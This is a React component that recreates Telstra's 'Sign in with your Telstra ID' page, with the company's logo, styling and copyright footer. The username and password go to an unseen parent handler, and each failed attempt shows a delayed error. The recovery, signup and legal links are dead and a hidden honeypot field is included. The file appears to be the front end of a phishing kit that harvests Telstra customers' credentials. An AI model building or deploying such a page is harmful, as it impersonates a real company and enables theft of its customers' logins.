import React, { useState, useEffect } from 'react';

const LoginPage = ({ onLoginAttempt, setLoading, userData, setUserData }) => {
  const [username, setUsername] = useState(userData?.username || '');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    if (userData?.username) {
      setUsername(userData.username);
    }
  }, [userData]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!username || !password) {
      setError('Please fill in all fields.');
      return;
    }

    setLoading(true);
    setError('');

    try {
      const result = await onLoginAttempt(username, password);
      
      if (!result.success) {
        setTimeout(() => {
          setError(result.error);
          setLoading(false);
          setPassword(''); // Clear password for security
        }, 2000);
      }
    } catch (error) {
      setError('An error occurred. Please try again.');
      setLoading(false);
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="page active">
      <div>
        <header className="t-page-header">
          <svg width="33px" height="33px" viewBox="0 0 33 33" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" aria-label="Telstra Logo" role="img" focusable="false">
            <g id="Artboard" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
              <g id="Telstra_Primary-logo_C_RGB" fillRule="nonzero">
                <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" id="Path" fill="#F96449"></path>
                <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
              </g>
            </g>
          </svg>
        </header>
        
        <div role="main" className="t-form-container">
          <h1 className="t-able-heading-b t-able-spacing-2x-mb">Sign in</h1>
          <div className="t-able-text-bodyshort t-able-spacing-7x-mb">Sign in with your Telstra ID</div>
          
          <form onSubmit={handleSubmit} autoComplete="off">
            <div className="t-able-text-field t-pwd-field t-able-spacing-2x-mb">
              <label htmlFor="username">Username</label>
              <input 
                type="text" 
                id="hp_email" 
                name="hp_email" 
                style={{display:'none'}} 
                autoComplete="off" 
                tabIndex="-1" 
                aria-hidden="true" 
              />
              <input 
                id="username" 
                type="text" 
                name="username" 
                autoFocus 
                autoComplete="username" 
                aria-invalid="false" 
                aria-required="true" 
                required
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
            </div>

            <div className="t-able-text-field t-pwd-field t-able-spacing-2x-mb">
              <label htmlFor="password">Password</label>
              <input 
                id="password" 
                type={showPassword ? "text" : "password"} 
                name="password" 
                autoComplete="current-password" 
                aria-invalid="false" 
                aria-required="true" 
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button 
                type="button" 
                className={`t-able-low-emph-button t-showpwd ${showPassword ? 't-icon--hidden' : ''}`}
                onClick={togglePasswordVisibility}
                aria-label={showPassword ? "Hide password characters" : "Show password characters"}
                style={{display: showPassword ? 'none' : 'inline-block'}}
              >
                Show
              </button>
              <button 
                type="button" 
                className="t-able-low-emph-button t-showpwd t-icon--hidden"
                onClick={togglePasswordVisibility}
                aria-label="Hide password characters"
                style={{display: showPassword ? 'inline-block' : 'none'}}
              >
                Hide
              </button>
              {error && (
                <p className="error-message show" style={{color: 'red', marginTop: '8px'}}>
                  {error}
                </p>
              )}
            </div>

            <div className="t-able-spacing-2x-mb">
              <a className="t-able-low-emph-button t-reset-password-link" href="#" onClick={(e) => e.preventDefault()}>
                Recover account
              </a>
            </div>
            
            <div className="t-able-checkbox t-able-spacing-3x-mb">
              <input name="rememberUsername" type="checkbox" id="rememberUsername" />
              <label htmlFor="rememberUsername">Remember username</label>
            </div>
            
            <div className="">
              <button className="t-able-high-emph-button t-able-spacing-2x-mb" type="submit">
                Continue
              </button>
            </div>
            
            <p className="t-able-sub-head-line t-able-spacing-2x-mb">OR</p>
            <a className="t-able-medium-emph-button t-able-spacing-7x-mb" href="#" onClick={(e) => e.preventDefault()}>
              Create a Telstra ID
            </a>
          </form>
        </div>
        
        <footer className="t-footer">
          <div className="t-footer-content">
            <p className="t-footer-copyright">Copyright © 2024 Telstra</p>
            <a className="t-footer-privacy" href="#" target="_blank" onClick={(e) => e.preventDefault()}>Privacy</a>
            <a className="t-footer-terms" href="#" target="_blank" onClick={(e) => e.preventDefault()}>Terms of use</a>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default LoginPage;
